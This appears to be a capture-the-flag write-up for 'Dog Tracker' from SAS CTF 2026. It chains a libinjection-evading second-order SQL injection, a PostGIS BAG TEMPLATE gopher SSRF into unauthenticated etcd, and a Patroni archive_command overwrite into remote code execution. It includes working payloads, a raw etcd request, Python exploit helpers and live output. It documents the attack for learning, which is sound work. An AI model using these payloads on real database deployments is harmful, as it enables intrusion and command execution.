@@ -1,0 +1,265 @@
+---
+title: 'SAS CTF 2026 - Dog Tracker'
+description: 'Chaining a libinjection-evading second-order SQLi into a PostGIS BAG TEMPLATE gopher SSRF, rewriting Patroni config in unauthenticated etcd to get archive_command RCE'
+date: 2026-08-09
+tags: ['writeup', 'web', 'sqli', 'waf-bypass', 'ssrf', 'rce', 'sasctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+A dog-tracking service, handed out as a `.tgz` with the full source and a `.git` directory. The flag lives in the database container.
+
+The chain that solves it, end to end:
+
+```text
+/api/chip?pulse=  SQLi  (signal_quality EXECUTE string-concat)
+  └─ libinjection bypass: '|| postgis_func(...) ||'   (no SELECT/UNION/;/comment)
+      └─ ST_AsGDALRaster(.., 'BAG', ARRAY['TEMPLATE=/vsicurl/gopher://..'])   SSRF
+          └─ gopher:// raw-TCP smuggle  →  etcd v2 API (no auth)
+              └─ overwrite Patroni DCS config  →  malicious archive_command
+                  └─ pg_logical_emit_message()  bulk WAL  →  segment switch
+                      └─ WAL archiver runs archive_command as the postgres UID
+                          └─ setuid-root /readflag  →  /flag.txt
+                              └─ stash flag in dogs.handler_hint  →  read via /api/chip
+```
+
+Everything is delivered through the single public web endpoint and read back in-band, so no outbound egress from the target is needed.
+
+## Source Code Analysis
+
+Three services: a Go app on `:8090` (the only published port), PostgreSQL 11 with PostGIS 2.5 managed by **Patroni**, and **etcd** as Patroni's configuration store with the v2 API enabled.
+
+### Where the flag actually is
+
+```bash
+# entry.sh
+echo "$FLAG" > /flag.txt
+chmod 400 /flag.txt          # root-only read
+unset FLAG                   # scrubbed from the environment
+exec su -m postgres -c "patroni /patroni.yml"
+```
+
+```dockerfile
+COPY --from=builder /app/nuclear_explosion /
+RUN chmod 4111 /nuclear_explosion        # setuid root, world-exec
+```
+
+```c
+// nuclear_explosion.c  (remote ships an equivalent /readflag)
+int main(int argc, char *argv[]) {
+    if (argc != 2 || strcmp(argv[1], "please") != 0) {
+        fprintf(stderr, "Usage: %s please\n", argv[0]); return 1;
+    }
+    FILE *f = fopen("/flag.txt", "r");      // root reads it because the binary is setuid
+    ...
+}
+```
+
+This shapes the entire challenge. `/flag.txt` is mode 400 owned by root and the `FLAG` env var is unset before postgres starts, so the flag is only reachable by *executing* the setuid helper. A file-read primitive is worthless here — we need OS command execution inside the database container.
+
+### The hint hiding in git history
+
+```bash
+$ git log --oneline
+8c1cea0 Redact compose flag
+c161611 Update compose deployment values
+d87027c Redact patroni credentials
+1dc4fb5 Add initial deployment config
+
+$ git log -p
+-      FLAG: SAS{g1t_h1st0ry_1s_pr377y_g00d?}     # decoy "flag" — a hint, not the flag
+-  auth: 'username:secretpasstheydontknow'        # Patroni REST creds (later REDACTED)
+-    password: secretpasstheydontknow             # superuser/replication/admin/pg_rewind
+```
+
+The decoy flag is a wink at the real lesson: the redaction commits scrubbed `HEAD`, but history still carries every credential. One password, `secretpasstheydontknow`, covers the postgres superuser, replication, admin, pg_rewind, and the Patroni REST API.
+
+### The injection
+
+`/api/chip` passes `pulse` *safely* as a bound parameter:
+
+```go
+func (engine *DatabaseEngine) signalQuality(value string) (int, error) {
+    ...
+    // value is passed SAFELY here ($1) ...
+    engine.db.Raw("SELECT signal_quality(?)", value).Scan(&quality)
+}
+```
+
+But the function it calls builds dynamic SQL by concatenation — a textbook second-order injection:
+
+```sql
+CREATE FUNCTION signal_quality(sample TEXT) RETURNS INTEGER LANGUAGE plpgsql AS $$
+DECLARE quality TEXT := '0';
+BEGIN
+  ...
+  EXECUTE 'SELECT quality::text
+    FROM (VALUES (''fresh'',84),(''stable'',61),(''weak'',27))
+      AS signal_samples(token, quality)
+    WHERE token = ''' || sample || '''' INTO quality;   -- << injection
+  RETURN COALESCE(NULLIF(regexp_replace(quality,'[^0-9]','','g'),'')::integer, 0);
+END; $$
+```
+
+The result is digit-stripped into an integer, so the direct return channel is numeric only. The function is `SECURITY INVOKER` owned by `ctfuser`, a deliberately de-privileged role:
+
+```sql
+CREATE ROLE ctfuser LOGIN PASSWORD 'ctfpassword';
+ALTER ROLE ctfuser NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION;
+ALTER DATABASE ctfdb SET postgis.gdal_enabled_drivers = 'BAG';   -- << the crucial knob
+```
+
+A Coraza WAF wraps every request with a single libinjection rule, and `urlDecodeUni` normalizes first so encoding tricks buy nothing:
+
+```text
+SecRule ARGS_NAMES|ARGS "@detectSQLi" \
+  "id:9421,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls,multiMatch,log,deny"
+```
+
+## What ctfuser can actually do
+
+Connecting directly to enumerate the constraints rules out every standard escalation:
+
+```text
+current_user                       = ctfuser  (NOT superuser)
+CREATE EXTENSION dblink             → permission denied (need superuser)
+lo_import / lo_export               → permission denied
+COPY ... TO/FROM '<file>'           → must be superuser / pg_write_server_files
+COPY ... TO/FROM PROGRAM            → must be superuser / pg_execute_server_program
+pg_read_file / pg_ls_dir            → permission denied
+ALTER SYSTEM                        → must be superuser
+postgis.gdal_enabled_drivers        = BAG (only the GDAL "BAG" driver is allowed)
+SET postgis.enable_outdb_rasters=t  → accepted in-session, but PGC_SUSET re-check
+                                       blocks out-db opens at runtime → VSICURL disabled
+```
+
+No file write, no file read, no program exec, no extensions. The single non-standard capability handed to us is that one GDAL driver, which makes it the intended door.
+
+BAG is an HDF5-based driver, and two of its features are dead ends here. HDF5 dynamically-loaded filter plugins would give RCE via `dlopen`, but the plugin directory is absent and root-owned, the env var is unset, and we have no file-write primitive to drop a shared object. HDF5 external dataset storage gives arbitrary file *read* as the postgres UID, which cannot read the root-only flag and is not exec anyway.
+
+The reachable one is the BAG driver's `TEMPLATE` creation option:
+
+```cpp
+// BAGCreator::GenerateMetadata  (reached via ST_AsGDALRaster create)
+CPLString osTemplateFilename = CSLFetchNameValueDef(papszOptions, "TEMPLATE", "");
+if (!osTemplateFilename.empty())
+    psRoot = CPLParseXMLFile(osTemplateFilename);   // → VSIIngestFile → full VSI layer
+```
+
+`CPLParseXMLFile` opens the path through GDAL's VSI layer, so `/vsicurl/` works, and the fetch happens *before* the raster create fails. The create errors out with "Could not create the output GDAL dataset", but the HTTP request already went out.
+
+The important part is that `/vsicurl/` hands the URL to libcurl, which speaks `gopher://`. Gopher sends arbitrary raw bytes over TCP, which turns a read-only metadata feature into a full SSRF with arbitrary method, headers and body.
+
+## The Vulnerability
+
+### Evading libinjection
+
+Rather than breaking out with a quote or a `UNION`, inject a concatenation expression into the `WHERE token = '...'` position, so the executed query becomes `WHERE token = '' || expr::text || ''`. The expression evaluates, its side effects fire, and there is no `SELECT`, `UNION`, semicolon or comment for libinjection to fingerprint:
+
+```text
+pulse=fresh                                          -> 200  baseline
+pulse='                                              -> 500  breakout, SQL error (live)
+pulse=x' UNION SELECT 1--                            -> 403  WAF blocks
+pulse='||version()||'                                -> 403  version is fingerprinted
+pulse='||current_setting('x')||'                     -> 403  fingerprinted
+pulse='||st_astext(st_makepoint(1,2))||'             -> 200  PostGIS names pass
+pulse='||st_asgdalraster(null,'BAG')::text||'        -> 200  our vector passes
+```
+
+PostGIS function names are not in libinjection's blocklist, so the entire SSRF expression sails through.
+
+### Gopher SSRF through TEMPLATE
+
+```text
+'||st_asgdalraster(
+     st_addband(st_makeemptyraster(8,8,0,0,1,-1,0,0,4326),'32BF'::text,0,NULL),
+     'BAG',
+     array['TEMPLATE=/vsicurl/gopher://HOST:PORT/_<URL-ENCODED-RAW-BYTES>'])::text||'
+```
+
+The raw HTTP request is percent-encoded byte by byte into the gopher selector, and arrives verbatim. A timing oracle confirmed reachability of the internal network — an unroutable host stalls for about 16 seconds while `etcd:2379` answers in under a second.
+
+### Turning SSRF into RCE
+
+Patroni's bootstrap config pre-sets an archive command with archiving already enabled:
+
+```yaml
+postgresql:
+  parameters:
+    archive_command: cd /
+    archive_mode: always        # << archiving is ON
+```
+
+Change `archive_command` and force a WAL segment to complete, and the WAL archiver runs it as the postgres OS user. Patroni stores its dynamic config in etcd, which has **no authentication at all**, so overwriting the key is enough — no password needed, unlike the REST API route:
+
+```http
+PUT /v2/keys/service/ctf-cluster/config HTTP/1.1
+Host: etcd:2379
+Content-Type: application/x-www-form-urlencoded
+
+value={"ttl":30,...,"postgresql":{"use_pg_rewind":true,"parameters":{
+        "archive_command":"<PAYLOAD>","archive_mode":"always",...}}}
+```
+
+Triggering the archiver is the last hurdle: `pg_switch_wal()` is superuser-only and stacked statements are WAF-blocked. But `pg_logical_emit_message` is callable inside an expression, allowed for `ctfuser`, and writes about 9 MB of WAL per call, so a few calls cross a 16 MB segment boundary and force the switch:
+
+```text
+'||pg_logical_emit_message(false,'p',repeat('A',9000000))::text||'
+```
+
+### Reading the flag back in-band
+
+`archive_command` runs as the postgres OS user, which owns a `.pgpass` entry, so `psql -U postgres` authenticates as superuser without us ever learning the password. Writing the output into a column the app already returns avoids needing egress at all:
+
+```bash
+( /readflag please ) > /tmp/f 2>&1;
+psql -U postgres -d ctfdb -c \
+  "UPDATE dogs SET handler_hint='OUT::'||pg_read_file('/tmp/f') WHERE id=1";
+true
+```
+
+A plain `GET /api/chip?chip=MSK-1042` then returns the flag in `handler_hint`.
+
+Three field notes matter for reliability. The whole command goes in a subshell so one redirect captures everything. `archive_command` must contain no newline, since that breaks `postgresql.conf` parsing, though single quotes are fine because Patroni doubles them. And there is a reload race — keep emitting WAL while polling so that a segment switch happens *after* Patroni picks up the new command, with a per-run nonce in the marker so stale output is never mistaken for fresh.
+
+## Exploitation
+
+```python
+def inj(expr):              # token = '' || (expr)::text || ''   -- libinjection-safe
+    return "'||" + expr + "||'"
+
+def ssrf(host, port, raw):  # smuggle raw TCP bytes via BAG TEMPLATE + /vsicurl/gopher
+    hexsel = "".join("%%%02x" % b for b in raw)
+    tmpl = f"/vsicurl/gopher://{host}:{port}/_{hexsel}"
+    return inj("st_asgdalraster(st_addband(st_makeemptyraster(8,8,0,0,1,-1,0,0,4326),"
+               "'32BF'::text,0,NULL),'BAG',array['TEMPLATE=" + tmpl + "'])::text")
+
+# 1) overwrite Patroni DCS config in etcd (no auth) with a malicious archive_command
+# 2) keep emitting WAL (pg_logical_emit_message) until a segment switch runs it
+# 3) read the command output back from /api/chip handler_hint
+```
+
+Running it against the remote confirms execution as the postgres UID, and finds the setuid helper is shipped as `/readflag` rather than the source's `/nuclear_explosion`:
+
+```text
+$ python3 run.py https://<instance>.kit.sasc.tf \
+      'id; echo ---SETUID---; find / -perm -4000 -type f 2>/dev/null'
+===== OUTPUT =====
+uid=70(postgres) gid=70(postgres) groups=70(postgres),70(postgres)
+---SETUID---
+/readflag
+==================
+
+$ python3 run.py https://<instance>.kit.sasc.tf '/readflag please'
+===== OUTPUT =====
+SAS{4ef48b54-1e81-49ce-a2df-c6a017733ef4}
+==================
+```
+
+## Flag
+
+```text
+SAS{4ef48b54-1e81-49ce-a2df-c6a017733ef4}
+```
